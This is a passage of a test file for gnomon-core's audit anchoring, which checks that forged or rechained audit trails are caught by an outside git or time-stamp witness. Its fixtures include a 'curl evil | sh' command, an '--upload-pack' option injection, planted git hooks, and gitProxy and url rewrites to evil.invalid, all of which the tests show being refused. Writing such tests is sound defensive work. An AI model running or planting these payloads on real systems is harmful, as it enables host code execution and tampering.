/**
 * gnomon-core: [audit.anchor] — sealed heads anchored outside the machine.
 *
 * The headline is the ninth attack of benchmarks/results/auditability-2026-08-31:
 * a full re-chain passes the hash chain, and with an anchor it is caught, with
 * the time after which it happened. The witnesses here are fakes: a local bare
 * git repository standing for the remote, an in-process time-stamp authority,
 * and a token OpenSSL's TSA produced once (conformance/anchor_rfc3161_openssl.json).
 * Nothing in this file reaches a network.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { mkdtempSync, rmSync, readFileSync, writeFileSync, existsSync, mkdirSync, readdirSync, chmodSync, cpSync, symlinkSync } from "node:fs";
import { tmpdir, hostname } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { spawnSync } from "node:child_process";
import { createHash, generateKeyPairSync, sign, type KeyObject } from "node:crypto";
import { AuditTrail, recordHash, resolveAudit, verifyTrail, canonicalJson, type AuditRecord } from "./audit.js";
import {
  announceAnchorBacklog,
  assertAnchorRepoConfig,
  collectAnchors,
  localAnchorRepo,
  legacyAnchorRepo,
  pinnedAnchorTarget,
  usePinnedAnchorTarget,
  _resetAnchorTargets,
  writeAnchorHandoff,
  readAnchorHandoff,
  enqueueAnchor,
  flushAnchors,
  pendingAnchors,
  resolveAnchor,
  scheduleAnchorFlush,
  setAnchorScheduler,
  statementDigest,
  verifyAgainstAnchors,
  ANCHOR_FORMAT,
  type AnchorStatement,
  type ResolvedAnchor,
} from "./anchor.js";
import {
  childrenOf,
  decodeOid,
  der,
  derBytes,
  derContent,
  OID,
  parseTimeStampResponse,
  readDer,
  timeStampRequest,
  verifyTimeStampToken,
} from "./rfc3161.js";
import { RecordGuard, recordExcludesOf } from "./record_guard.js";
import { writeCheckpoint } from "./record_tamper.js";
import type { GnomonConfig } from "./config.js";

// Every git-backed test spawns a dozen git processes; on Windows and macOS CI
// runners that is seconds, not the default five.
vi.setConfig({ testTimeout: 60_000 });

let root: string;
/** Where witnesses live: outside the project root, which a sandboxed command may write (fourth review, finding 1). */
let remotes: string;
const auditDir = () => join(root, ".gnomon-audit");

function cfg(anchor?: Record<string, unknown>): GnomonConfig {
  return {
    gnomonDir: join(root, ".gnomon"),
    config: { audit: { enabled: true, ...(anchor ? { anchor } : {}) } },
  } as unknown as GnomonConfig;
}

function git(args: string[], cwd?: string): string {
  const r = spawnSync("git", args, { cwd, encoding: "utf-8" });
  if (r.status !== 0) throw new Error(`git ${args.join(" ")}: ${r.stderr}`);
  return r.stdout.trim();
}

/** A bare repository standing for the remote. Append-only the way a real one is made so. */
function bareRemote(name = "remote.git", appendOnly = true): string {
  const p = join(remotes, name);
  git(["init", "--bare", "-q", p]);
  if (appendOnly) {
    git(["--git-dir", p, "config", "receive.denyNonFastForwards", "true"]);
    git(["--git-dir", p, "config", "receive.denyDeletes", "true"]);
  }
  return p;
}

/** Write and seal a trail: session_start, n tool calls, session_end. */
function sealTrail(c: GnomonConfig, id: string, n = 4): string {
  const t = new AuditTrail(resolveAudit(c), id);
  t.write("session_start", { mode: "test" });
  for (let i = 0; i < n; i++) t.write("tool_call", { tool: "read", target: `f${i}.ts`, role: "implement" });
  t.write("session_end", {});
  return t.path!;
}

const load = (p: string): AuditRecord[] =>
  readFileSync(p, "utf-8").split("\n").filter(Boolean).map((l) => JSON.parse(l) as AuditRecord);
const save = (p: string, rs: AuditRecord[]) => writeFileSync(p, rs.map((r) => JSON.stringify(r)).join("\n") + "\n");

/** The forger who understands the format: edit, then recompute every hash. */
function rechain(p: string, edit: (rs: AuditRecord[]) => void): void {
  const rs = load(p);
  edit(rs);
  let prev: string | null = null;
  for (const r of rs) {
    r.prev = prev;
    delete r.hash;
    r.hash = recordHash(r);
    prev = r.hash;
  }
  save(p, rs);
}

const anchorOf = (c: GnomonConfig): ResolvedAnchor => resolveAudit(c).anchor!;

async function report(c: GnomonConfig, trails: string[], opts: { offline?: boolean; deps?: Parameters<typeof collectAnchors>[1]["deps"] } = {}) {
  const a = anchorOf(c);
  const log = await collectAnchors(a, opts);
  return verifyAgainstAnchors(a, log, trails, { acceptUnchecked: opts.offline });
}

let captured: ResolvedAnchor[] = [];
beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), "gnomon-anchor-"));
  remotes = mkdtempSync(join(tmpdir(), "gnomon-anchor-remotes-"));
  captured = [];
  _resetAnchorTargets();
  // Deterministic: nothing is delivered behind a test's back. Tests that
  // deliver call flushAnchors and await it.
  setAnchorScheduler((s) => void captured.push(s));
});
afterEach(() => {
  setAnchorScheduler(null);
  rmSync(root, { recursive: true, force: true });
  rmSync(remotes, { recursive: true, force: true });
});

// ---------------------------------------------------------------------------

describe("absent [audit.anchor]: exactly the current behaviour", () => {
  it("resolves off, queues nothing, schedules nothing, excludes nothing", () => {
    const c = cfg();
    const a = anchorOf(c);
    expect(a).toMatchObject({ enabled: false, declared: false, backend: null, problems: [] });
    // Not even the host lookup: the scope is left empty.
    expect(a.scope).toBe("");
    sealTrail(c, "s1");
    expect(existsSync(join(auditDir(), "anchors"))).toBe(false);
    scheduleAnchorFlush(a);
    expect(captured).toEqual([]);
    expect(recordExcludesOf(c)).toEqual([]);
  });

  it("announces nothing and records nothing", () => {
    const said: string[] = [];
    const records: unknown[] = [];
    expect(announceAnchorBacklog(anchorOf(cfg()), { say: (l) => said.push(l), audit: { write: (_k, f) => void records.push(f) } })).toBeNull();
    expect(said).toEqual([]);
    expect(records).toEqual([]);
  });
});

describe("resolving [audit.anchor]", () => {
  const problems = (anchor: Record<string, unknown>) => anchorOf(cfg(anchor)).problems.join(" | ");

  it("a declared block that cannot work is reported, not read as off", () => {
    expect(anchorOf(cfg({}))).toMatchObject({ declared: true, enabled: false });
    expect(problems({})).toMatch(/no `backend`/);
    expect(problems({ backend: "rekor" })).toMatch(/not one of git, rfc3161, cmd/);
    expect(problems({ backend: "git" })).toMatch(/needs `remote`/);
    expect(problems({ backend: "git", remote: "x", ref: "main" })).toMatch(/not a full ref name/);
    expect(problems({ backend: "rfc3161", url: "ftp://tsa" })).toMatch(/needs `url`/);
    expect(problems({ backend: "rfc3161", url: "https://tsa.example/tsr" })).toMatch(/no `tsa_cert`/);
    expect(problems({ backend: "rfc3161", url: "https://tsa.example/tsr", tsa_cert: "nope.pem" })).toMatch(/neither PEM nor a readable file/);
    expect(problems({ backend: "cmd" })).toMatch(/needs `command`/);
    expect(problems({ backend: "git", remote: "r", timeout_sec: -1 })).toMatch(/timeout_sec/);
  });

  it("a ref outside refs/heads/ is reported: git's own protections do not cover it", () => {
    // Found by the attacker test below: a forced push to refs/gnomon/anchors
    // went through a remote with receive.denyNonFastForwards and denyDeletes.
    const a = anchorOf(cfg({ backend: "git", remote: "r", ref: "refs/gnomon/anchors" }));
    expect(a.enabled).toBe(true);
    expect(a.problems.join(" ")).toMatch(/outside refs\/heads\/.*can be force-pushed/);
    expect(anchorOf(cfg({ backend: "git", remote: "r" })).problems).toEqual([]);
  });

  it("the protection is real on refs/heads/ and absent elsewhere (git's receive-pack, measured)", () => {
    const remote = bareRemote();
    const scratch = join(root, "s.git");
    git(["init", "--bare", "-q", scratch]);
    const commit = (body: string) => {
      const blob = spawnSync("git", ["--git-dir", scratch, "hash-object", "-w", "--stdin"], { input: body, encoding: "utf-8" }).stdout.trim();
      const tree = spawnSync("git", ["--git-dir", scratch, "mktree"], { input: `100644 blob ${blob}\tanchors.jsonl\n`, encoding: "utf-8" }).stdout.trim();
      return spawnSync("git", ["--git-dir", scratch, "-c", "user.name=x", "-c", "user.email=x@x", "commit-tree", tree, "-m", body], { encoding: "utf-8" }).stdout.trim();
    };
    const a = commit("a");
    const b = commit("b");
    const push = (src: string, ref: string, force: boolean) =>
      spawnSync("git", ["--git-dir", scratch, "push", "-q", ...(force ? ["--force"] : []), remote, `${src}:${ref}`], { encoding: "utf-8" }).status;
    for (const ref of ["refs/heads/gnomon-anchors", "refs/gnomon/anchors"]) expect(push(a, ref, false)).toBe(0);
    expect(push(b, "refs/heads/gnomon-anchors", true)).not.toBe(0);
    expect(push(b, "refs/gnomon/anchors", true)).toBe(0);
  });

  it("a usable block is on, with a scope and the anchors directory in the audit directory", () => {
    const a = anchorOf(cfg({ backend: "git", remote: "../witness.git" }));
    expect(a).toMatchObject({ enabled: true, backend: "git", ref: "refs/heads/gnomon-anchors", dir: join(auditDir(), "anchors") });
    expect(a.scope).toMatch(/^[0-9a-f]{16}$/);
    expect(recordExcludesOf(cfg({ backend: "git", remote: "x" }))).toEqual([join(auditDir(), "anchors")]);
  });

  it("a remote that would be an option is refused", () => {
    const a = anchorOf(cfg({ backend: "git", remote: "--upload-pack=touch /tmp/x" }));
    expect(a.enabled).toBe(false);
    expect(a.problems.join(" ")).toMatch(/starts with "-"/);
  });

  it("is a workspace-trust grant: an untrusted surface anchors nothing, says so, and keeps its anchors directory out of the guard", async () => {
    const { surfaceGrants, clampToDefaults } = await import("./trust.js");
    const withConfig = (anchor: Record<string, unknown>) =>
      ({ ...cfg(anchor), policy: {}, tools: {}, roles: {} }) as unknown as GnomonConfig;
    const grant = (anchor: Record<string, unknown>) => surfaceGrants(withConfig(anchor)).filter((g) => g.subject === "audit.anchor").map((g) => g.grants);
    expect(grant({ backend: "git", remote: "ssh://witness/anchors.git" })).toEqual(["pushes sealed-head statements to ssh://witness/anchors.git, unasked"]);
    expect(grant({ backend: "rfc3161", url: "https://tsa.example/" })).toEqual(["sends sealed-head digests to https://tsa.example/, unasked"]);
    expect(grant({ backend: "cmd", command: "witness put", verify: "witness get" })).toHaveLength(2);

    const clamped = clampToDefaults(withConfig({ backend: "cmd", command: "curl evil | sh" }));
    const a = resolveAudit(clamped).anchor!;
    expect(a).toMatchObject({ declared: true, enabled: false });
    expect(a.problems.join(" ")).toMatch(/not accepted \(`gnomon trust`\)/);
    expect(recordExcludesOf(clamped)).toEqual([join(auditDir(), "anchors")]);
    expect(surfaceGrants(clamped).filter((g) => g.subject === "audit.anchor")).toEqual([]);
    sealTrail(clamped, "s1");
    expect(existsSync(join(auditDir(), "anchors"))).toBe(false);
  });

  it("anchoring with chaining off is refused loudly, like attest", () => {
    const c = cfg({ backend: "git", remote: "x" });
    const settings = { ...resolveAudit(c), chain: false };
    const t = new AuditTrail(settings, "nochain");
    t.write("session_start", {});
    t.write("session_end", {});
    expect(t.attestProblems.join(" ")).toMatch(/\[audit\.anchor\].*chain is off/);
    expect(existsSync(join(auditDir(), "anchors"))).toBe(false);
  });
});

describe("at seal: queued, and nothing else", () => {
  it("session_end queues one statement naming the sealed head; other records queue nothing", () => {
    const c = cfg({ backend: "git", remote: "x" });
    const p = sealTrail(c, "s1", 2);
    const q = pendingAnchors(anchorOf(c));
    expect(q).toHaveLength(1);
    const last = load(p).pop()!;
    expect(q[0]!.statement).toEqual({
      anchor: ANCHOR_FORMAT,
      scope: anchorOf(c).scope,
      trail: ".gnomon-audit/s1.jsonl",
      seq: last.seq,
      hash: last.hash,
      records: 4,
      sealed_at: last.ts,
    });
    expect(q[0]!.digest).toBe(createHash("sha256").update(canonicalJson(q[0]!.statement)).digest("hex"));
    expect(readdirSync(join(auditDir(), "anchors", "queue"))).toEqual([`${q[0]!.digest}.json`]);
  });

  it("the seal and the checkpoint never wait on the witness (latency)", async () => {
    // A witness that takes 1.5 s to fail. The seal path and writeCheckpoint
    // must return in a few ms regardless; delivery runs on its own clock.
    const c = cfg({ backend: "rfc3161", url: "http://tsa.invalid/" });
    mkdirSync(join(root, ".gnomon"), { recursive: true });
    writeFileSync(join(root, ".gnomon", "config.toml"), "[audit]\nenabled = true\n");
    let flush: Promise<unknown> | null = null;
    const slow = (async () => {
      await new Promise((r) => setTimeout(r, 1500));
      throw new Error("unreachable");
    }) as unknown as typeof fetch;
    setAnchorScheduler((s) => {
      flush = flushAnchors(s, { fetch: slow });
    });

    const base = cfg();
    const t0 = performance.now();
    sealTrail(base, "off");
    const offMs = performance.now() - t0;

    const t1 = performance.now();
    sealTrail(c, "on");
    writeCheckpoint(c);
    const onMs = performance.now() - t1;

    expect(flush).not.toBeNull();
    expect(onMs).toBeLessThan(400);
    expect(offMs).toBeLessThan(400);
    // Still queued while the witness is slow; queued, not lost, when it fails.
    expect(pendingAnchors(anchorOf(c)).length).toBe(2);
    const r = (await flush) as { delivered: number; pending: number; error?: string };
    expect(r).toMatchObject({ delivered: 0, pending: 2 });
    expect(r.error).toMatch(/unreachable/);
  });
});

// ---------------------------------------------------------------------------
// git
// ---------------------------------------------------------------------------

describe("git backend", () => {
  // PR #156 second review, A: the local anchor repository is inside the
  // project root, which a sandboxed bash may write. Its hooks dir was too
  // (core.hooksPath pointed into it), and `update-ref` runs
  // reference-transaction -- on the host, at session end.
  it("runs no hook a command planted in the local anchor repository, and refuses a changed config", async () => {
    const remote = bareRemote();
    const c = cfg({ backend: "git", remote });
    sealTrail(c, "s1");
    await flushAnchors(anchorOf(c));
    const repo = localAnchorRepo(anchorOf(c));
    const marker = join(root, "hook-ran");
    for (const d of ["no-hooks", "hooks"]) {
      mkdirSync(join(repo, d), { recursive: true });
      writeFileSync(join(repo, d, "reference-transaction"), `#!/bin/sh\ntouch '${marker}'\n`, { mode: 0o755 });
    }
    sealTrail(c, "s2");
    const r = await flushAnchors(anchorOf(c));
    expect(r).toMatchObject({ delivered: 1, pending: 0 });
    expect(existsSync(marker), "a planted hook ran from gnomon's anchor git").toBe(false);
    // CONTROL: the hooks dir the anchor git used before is live for a git that uses it.
    git(["--git-dir", repo, "-c", `core.hooksPath=${join(repo, "no-hooks")}`, "update-ref", "refs/x", git(["--git-dir", repo, "rev-parse", "refs/heads/gnomon-anchors"])]);
    expect(existsSync(marker), "control: the planted hook did not run").toBe(true);

    // A key `git init --bare` never writes: nothing is run there, nothing anchored.
    writeFileSync(join(repo, "config"), readFileSync(join(repo, "config"), "utf-8") + `[core]\n\tsshCommand = touch '${marker}2'\n`);
    sealTrail(c, "s3");
    const refused = await flushAnchors(anchorOf(c));
    expect(refused.pending).toBeGreaterThan(0);
    expect(JSON.stringify(refused)).toContain("config was changed");
    expect(() => assertAnchorRepoConfig(repo)).toThrow(/core\.sshcommand/);
  });

  // Third review, finding 4: the allow-list read only <repo>/config, and a
  // `commondir` file sends git to another directory's config -- here one
  // that rewrites the remote to git:// and names a core.gitProxy program.
  it.skipIf(process.platform === "win32")("a commondir planted in the anchor repository inside the root runs nothing on the host", async () => {
    const remote = bareRemote();
    const c = cfg({ backend: "git", remote });
    sealTrail(c, "s1");
    await flushAnchors(anchorOf(c));
    const inRoot = join(anchorOf(c).dir, "git");
    if (!existsSync(join(inRoot, "HEAD"))) git(["init", "--bare", "-q", inRoot]);
    const marker = join(root, "proxy-ran");
    const proxy = join(root, "proxy.sh");
    writeFileSync(proxy, `#!/bin/sh\ntouch '${marker}'\nexit 1\n`, { mode: 0o755 });
    const common = join(root, "common.git");
    cpSync(inRoot, common, { recursive: true });
    writeFileSync(join(common, "config"), readFileSync(join(common, "config"), "utf-8") + `[url "git://evil.invalid/x"]\n\tinsteadOf = ${remote}\n[core]\n\tgitProxy = ${proxy}\n`);
    writeFileSync(join(inRoot, "commondir"), `${common}\n`);
    sealTrail(c, "s2");
    await flushAnchors(anchorOf(c));
    expect(existsSync(marker), "a program the planted commondir named ran from gnomon's anchor git").toBe(false);
    // CONTROL: plain git with that repository runs it.
    spawnSync("git", ["--git-dir", inRoot, "ls-remote", remote], { stdio: "ignore" });
    expect(existsSync(marker), "control: the planted redirect is not live").toBe(true);
  });

  it("keeps the local anchor repository outside the project root, and reads no copy left inside it", async () => {
    const remote = bareRemote();
    const c = cfg({ backend: "git", remote });
    sealTrail(c, "s1");
    expect((await flushAnchors(anchorOf(c))).delivered).toBe(1);
    const repo = localAnchorRepo(anchorOf(c));
    expect(existsSync(join(repo, "HEAD"))).toBe(true);
    expect(repo.startsWith(root)).toBe(false);
    expect(existsSync(legacyAnchorRepo(anchorOf(c)))).toBe(false);
    // An old copy left in the root is not read, offline or not.
    git(["init", "--bare", "-q", legacyAnchorRepo(anchorOf(c))]);
    rmSync(repo, { recursive: true, force: true });
    const off = await collectAnchors(anchorOf(c), { offline: true });
    expect(off.anchors).toEqual([]);
    expect(off.problems.join(" ")).toMatch(/not read/);
  });

  it("refuses a local anchor repository that redirects git, holds a symlink, or names a url rewrite", async () => {
    const remote = bareRemote();
    const c = cfg({ backend: "git", remote });
    sealTrail(c, "s1");
    await flushAnchors(anchorOf(c));
    const repo = localAnchorRepo(anchorOf(c));
    const clean = readFileSync(join(repo, "config"), "utf-8");
    for (const f of ["commondir", "config.worktree", join("objects", "info", "alternates")]) {
      writeFileSync(join(repo, f), `${root}\n`);
      expect(() => assertAnchorRepoConfig(repo), f).toThrow(/points git at another repository/);
      rmSync(join(repo, f));
    }
    writeFileSync(join(repo, "config"), clean + `[url "ssh://evil.invalid/"]\n\tinsteadOf = /\n`);
    expect(() => assertAnchorRepoConfig(repo)).toThrow(/url\.<sub>\.insteadof/);
    writeFileSync(join(repo, "config"), clean);
    if (process.platform !== "win32") {
      symlinkSync(root, join(repo, "refs", "escape"));
      sealTrail(c, "s2");
      const r = await flushAnchors(anchorOf(c));
      expect(r.pending).toBeGreaterThan(0);
      expect(String(r.error)).toMatch(/symlink/);
    }
  });

  it("a detached delivery uses the target its session pinned", async () => {
    const good = bareRemote("good2.git");
    git(["init", "-q", root]);
    git(["-C", root, "remote", "add", "witness", join(remotes, "nowhere.git")]);
    const c = cfg({ backend: "git", remote: "witness" });
    sealTrail(c, "s1");
    const a = anchorOf(c);
    expect(pinnedAnchorTarget(a)).toBe(join(remotes, "nowhere.git"));
    usePinnedAnchorTarget(a, good);
    expect((await flushAnchors(a)).delivered).toBe(1);
    expect(git(["--git-dir", good, "rev-parse", "refs/heads/gnomon-anchors"])).toMatch(/^[0-9a-f]{40}/);
  });

  // Third review, finding 5: a remote NAMED through the workspace's own
  // repository was read from its .git/config at delivery, which a sandboxed
  // command can rewrite during the session.
  it("a workspace remote rewritten after the session started does not move where anchors go", async () => {
    const good = bareRemote("good.git");
    const evil = bareRemote("evil.git");
    git(["init", "-q", root]);
    git(["-C", root, "remote", "add", "witness", good]);
    const c = cfg({ backend: "git", remote: "witness" });
    sealTrail(c, "s1");
    anchorOf(c); // the session's start resolves its audit settings
    git(["-C", root, "remote", "set-url", "witness", evil]);
    const r = await flushAnchors(anchorOf(c));
    expect(r).toMatchObject({ delivered: 1, pending: 0 });
    expect(spawnSync("git", ["--git-dir", evil, "rev-parse", "--verify", "-q", "refs/heads/gnomon-anchors"]).status, "anchors went to the rewritten remote").not.toBe(0);
    expect(git(["--git-dir", good, "rev-parse", "refs/heads/gnomon-anchors"])).toMatch(/^[0-9a-f]{40}/);
  });

  // Fourth review, finding 1: a bare word counted as a remote's NAME only
  // while <root>/<word> did not exist. A container created <root>/origin as
  // a bare repository with a pre-receive hook, and the session-end push went
  // to that local path -- where git clears GIT_CONFIG_PARAMETERS for the
  // receive-pack it starts, so `-c core.hooksPath` did not reach it and the
  // hook ran on the host.
  it.skipIf(process.platform === "win32")("finding 1: a directory created under the root after the session started does not turn a remote's name into a path", async () => {
    const good = bareRemote("good.git");
    git(["init", "-q", root]);
    git(["-C", root, "remote", "add", "origin", good]);
    const c = cfg({ backend: "git", remote: "origin" });
    sealTrail(c, "s1");
    anchorOf(c); // the session's start
    const marker = join(remotes, "pre-receive-ran");
    git(["init", "--bare", "-q", join(root, "origin")]);
    writeFileSync(join(root, "origin", "hooks", "pre-receive"), `#!/bin/sh\ntouch '${marker}'\n`, { mode: 0o755 });
    await flushAnchors(anchorOf(c));
    expect(existsSync(marker), "a hook in a repository the container made under the root ran on the host").toBe(false);
    expect(git(["--git-dir", good, "rev-parse", "refs/heads/gnomon-anchors"])).toMatch(/^[0-9a-f]{40}/);
  });

  it.skipIf(process.platform === "win32")("finding 1: a local witness inside the project root is refused, whatever names it", async () => {
    const marker = join(remotes, "inside-ran");
    const inside = join(root, "w.git");
    git(["init", "--bare", "-q", inside]);
    writeFileSync(join(inside, "hooks", "pre-receive"), `#!/bin/sh\ntouch '${marker}'\n`, { mode: 0o755 });
    for (const remote of [inside, "w.git", `file://${inside}`]) {
      _resetAnchorTargets();
      const c = cfg({ backend: "git", remote });
      sealTrail(c, `s-${remote.length}`);
      const r = await flushAnchors(anchorOf(c));
      expect(r.pending, remote).toBeGreaterThan(0);
      expect(String(r.error), remote).toMatch(/inside the project root/);
    }
    expect(existsSync(marker)).toBe(false);
  });

  it.skipIf(process.platform === "win32")("finding 1: a push to a local witness runs none of its hooks", async () => {
    const remote = bareRemote();
    const marker = join(root, "remote-hook-ran");
    for (const h of ["pre-receive", "update", "post-receive", "reference-transaction"]) {
      writeFileSync(join(remote, "hooks", h), `#!/bin/sh\ntouch '${marker}'\n`, { mode: 0o755 });
    }
    const c = cfg({ backend: "git", remote });
    sealTrail(c, "s1");
    expect((await flushAnchors(anchorOf(c))).delivered).toBe(1);
    expect(existsSync(marker), "a hook of the local witness ran from gnomon's push").toBe(false);
  });

  it("finding 6: a delivery's sealed settings are read only from gnomon's data directory, and only once", () => {
    const a = anchorOf(cfg({ backend: "git", remote: bareRemote() }));
    const f = writeAnchorHandoff(a);
    expect(f.startsWith(root)).toBe(false);
    expect(readAnchorHandoff(f)).toMatchObject({ backend: "git", root: a.root, remote: a.remote });
    expect(existsSync(f), "a handoff is read once").toBe(false);
    const forged = join(root, "handoff.json");
    writeFileSync(forged, JSON.stringify({ v: 1, settings: { ...a, backend: "cmd", command: "touch x" }, target: null }));
    expect(() => readAnchorHandoff(forged)).toThrow(/not a sealed anchor handoff/);
  });

  it("delivers queued heads as one fast-forward commit, and reads them back from the remote", async () => {
    const remote = bareRemote();
    const c = cfg({ backend: "git", remote });
    const p1 = sealTrail(c, "s1");
    const p2 = sealTrail(c, "s2");
    const r = await flushAnchors(anchorOf(c));
    expect(r).toMatchObject({ backend: "git", delivered: 2, pending: 0 });
    expect(pendingAnchors(anchorOf(c))).toEqual([]);

    const tip = git(["--git-dir", remote, "rev-parse", "refs/heads/gnomon-anchors"]);
    const lines = git(["--git-dir", remote, "show", `${tip}:anchors.jsonl`]).split("\n");
    expect(lines).toHaveLength(2);
    // Anyone holding the remote recomputes the digest with sha256 alone.
    for (const l of lines) expect(canonicalJson(JSON.parse(l))).toBe(l);

    const rep = await report(c, [p1, p2]);
    expect(rep.source).toBe("remote");
    expect(rep.trails.map((t) => t.status)).toEqual(["anchored", "anchored"]);
    expect(rep.ok).toBe(true);

    // A second flush appends on top: the history only grows.
    sealTrail(c, "s3");
    await flushAnchors(anchorOf(c));
    const next = git(["--git-dir", remote, "rev-parse", "refs/heads/gnomon-anchors"]);
    expect(git(["--git-dir", remote, "rev-parse", `${next}^`])).toBe(tip);
  });

  it("the full re-chain passes the chain and is caught by the anchor, with when", async () => {
    const remote = bareRemote();
    const c = cfg({ backend: "git", remote });
    const p = sealTrail(c, "s1");
    await flushAnchors(anchorOf(c));

    rechain(p, (rs) => {
      rs[2]!.role = "root";
    });
    const chain = verifyTrail(p);
    expect(chain).toMatchObject({ ok: true, sealed: true });

    const rep = await report(c, [p]);
    const t = rep.trails[0]!;
    expect(t.status).toBe("rechained");
    expect(t.first_mismatch).toMatchObject({ seq: 5, reason: "hash_mismatch" });
    expect(t.rewritten).toMatchObject({ from_seq: 0, to_seq: 5 });
    expect(t.rewritten!.after).toBe(t.first_mismatch!.anchored_at);
    expect(t.detail).toMatch(/change is in seq 0–5 and was made after that anchor/);
    expect(rep.ok).toBe(false);
  });

  it("an attacker who knows about anchoring: wipes the local state, cannot force the remote, re-anchors the forgery — still caught", async () => {
    const remote = bareRemote();
    const c = cfg({ backend: "git", remote });
    const p = sealTrail(c, "s1");
    await flushAnchors(anchorOf(c));
    const original = git(["--git-dir", remote, "rev-parse", "refs/heads/gnomon-anchors"]);

    rechain(p, (rs) => {
      rs[2]!.role = "root";
    });
    rmSync(join(auditDir(), "anchors"), { recursive: true, force: true });
    // A forced push of a history without the original anchor is refused.
    const scratch = join(root, "scratch.git");
    git(["init", "--bare", "-q", scratch]);
    const blob = spawnSync("git", ["--git-dir", scratch, "hash-object", "-w", "--stdin"], { input: "{}\n", encoding: "utf-8" }).stdout.trim();
    const tree = spawnSync("git", ["--git-dir", scratch, "mktree"], { input: `100644 blob ${blob}\tanchors.jsonl\n`, encoding: "utf-8" }).stdout.trim();
    const forged = spawnSync("git", ["--git-dir", scratch, "-c", "user.name=x", "-c", "user.email=x@x", "commit-tree", tree, "-m", "x"], { encoding: "utf-8" }).stdout.trim();
    const force = spawnSync("git", ["--git-dir", scratch, "push", "--force", remote, `${forged}:refs/heads/gnomon-anchors`], { encoding: "utf-8" });
    expect(force.status).not.toBe(0);
    expect(git(["--git-dir", remote, "rev-parse", "refs/heads/gnomon-anchors"])).toBe(original);

    // The forged head is anchored too, by the attacker, as gnomon would.
    const last = load(p).pop()!;
    enqueueAnchor(anchorOf(c), p, last, load(p).length);
    expect((await flushAnchors(anchorOf(c))).delivered).toBe(1);

    const t = (await report(c, [p])).trails[0]!;
    expect(t.status).toBe("rechained");
    expect(t.reanchored).toBeDefined();
    expect(t.detail).toMatch(/rewrite itself was anchored later/);
  });

  it("a resealed trail localises the rewrite between two anchors", async () => {
    // `gnomon guard` reseals one trail per call: each seal is an anchor.
    const remote = bareRemote();
    const c = cfg({ backend: "git", remote });
    const s = resolveAudit(c);
    const t1 = new AuditTrail(s, "guard-x");
    t1.write("session_start", {});
    t1.write("guard", { decision: "allow" });
    t1.write("session_end", {});
    const t2 = new AuditTrail(s, "guard-x", { append: true });
    t2.write("session_resume", {});
    t2.write("guard", { decision: "deny" });
    t2.write("session_end", {});
    await flushAnchors(anchorOf(c));

    rechain(t1.path!, (rs) => {
      rs[4]!.decision = "allow";
    });
    const t = (await report(c, [t1.path!])).trails[0]!;
    expect(t.status).toBe("rechained");
    expect(t.last_match?.seq).toBe(2);
    expect(t.rewritten).toMatchObject({ from_seq: 3, to_seq: 5 });
  });

  it("offline: stays queued, is announced and recorded, and is delivered once the remote is there", async () => {
    const remote = join(remotes, "later.git");
    const c = cfg({ backend: "git", remote });
    const p = sealTrail(c, "s1");
    const r = await flushAnchors(anchorOf(c));
    expect(r).toMatchObject({ delivered: 0, pending: 1 });
    expect(r.error).toMatch(/unreachable/);

    const said: string[] = [];
    const records: Array<Record<string, unknown>> = [];
    const b = announceAnchorBacklog(anchorOf(c), { say: (l) => said.push(l), audit: { write: (_k, f) => void records.push(f) } });
    expect(b?.pending).toBe(1);
    expect(said.join("\n")).toMatch(/not yet anchored to git/);
    expect(records).toEqual([expect.objectContaining({ id: "audit_anchor_queued" })]);
    // ...and a retry is started.
    expect(captured).toHaveLength(1);
    expect((await report(c, [p])).trails[0]!.status).toBe("pending");

    git(["init", "--bare", "-q", remote]);
    expect(await flushAnchors(anchorOf(c))).toMatchObject({ delivered: 1, pending: 0 });
    expect((await report(c, [p])).trails[0]!.status).toBe("anchored");
  });

  it("a queue a delivery is still working through is not announced as a degradation", () => {
    const c = cfg({ backend: "git", remote: join(remotes, "none.git") });
    sealTrail(c, "s1");
    const said: string[] = [];
    expect(announceAnchorBacklog(anchorOf(c), { say: (l) => said.push(l) })).toBeNull();
    expect(said).toEqual([]);
    // Past the grace period with no attempt at all, it is.
    const later = new Date(Date.now() + 10 * 60_000);
    expect(announceAnchorBacklog(anchorOf(c), { say: (l) => said.push(l), now: later })?.pending).toBe(1);
    expect(said.join("\n")).toMatch(/no delivery has run/);
  });

  it("a deleted anchored trail, and a rolled-back checkpoint, are findings", async () => {
    const remote = bareRemote();
    mkdirSync(join(root, ".gnomon"), { recursive: true });
    const c = cfg({ backend: "git", remote });
    const p = sealTrail(c, "gone");
    const cp = writeCheckpoint(c)!;
    await flushAnchors(anchorOf(c));
    let rep = await report(c, [p, cp.trail]);
    expect(rep.ok).toBe(true);

    rmSync(p);
    rmSync(cp.trail);
    rmSync(cp.map);
    rep = await report(c, []);
    expect(rep.missing.map((m) => m.trail)).toEqual([".gnomon-audit/gone.jsonl"]);
    expect(rep.rollback?.checkpoint).toMatch(/checkpoints\/checkpoint-/);
    expect(rep.findings.join(" ")).toMatch(/rollback/);
    expect(rep.ok).toBe(false);
  });

  it("an older checkpoint pruned in favour of a newer anchored one is not a finding", async () => {
    const remote = bareRemote();
    mkdirSync(join(root, ".gnomon"), { recursive: true });
    const c = cfg({ backend: "git", remote });
    writeCheckpoint(c);
    const second = writeCheckpoint(c)!;
    await flushAnchors(anchorOf(c));
    const rep = await report(c, [second.trail]);
    expect(rep.missing).toEqual([]);
    expect(rep.rollback).toBeUndefined();
    expect(rep.ok).toBe(true);
  });

  it("a remote whose history was rewritten since it was last read is a finding", async () => {
    const remote = bareRemote("loose.git", false);
    const c = cfg({ backend: "git", remote });
    const p = sealTrail(c, "s1");
    await flushAnchors(anchorOf(c));
    expect((await report(c, [p])).ok).toBe(true);

    // Someone with force-push rights replaces the history.
    const scratch = join(root, "scratch.git");
    git(["init", "--bare", "-q", scratch]);
    const blob = spawnSync("git", ["--git-dir", scratch, "hash-object", "-w", "--stdin"], { input: "", encoding: "utf-8" }).stdout.trim();
    const tree = spawnSync("git", ["--git-dir", scratch, "mktree"], { input: `100644 blob ${blob}\tanchors.jsonl\n`, encoding: "utf-8" }).stdout.trim();
    const forged = spawnSync("git", ["--git-dir", scratch, "-c", "user.name=x", "-c", "user.email=x@x", "commit-tree", tree, "-m", "x"], { encoding: "utf-8" }).stdout.trim();
    git(["--git-dir", scratch, "push", "-q", "--force", remote, `${forged}:refs/heads/gnomon-anchors`]);

    const rep = await report(c, [p]);
    expect(rep.findings.join(" ")).toMatch(/history was rewritten/);
    expect(rep.ok).toBe(false);
  });

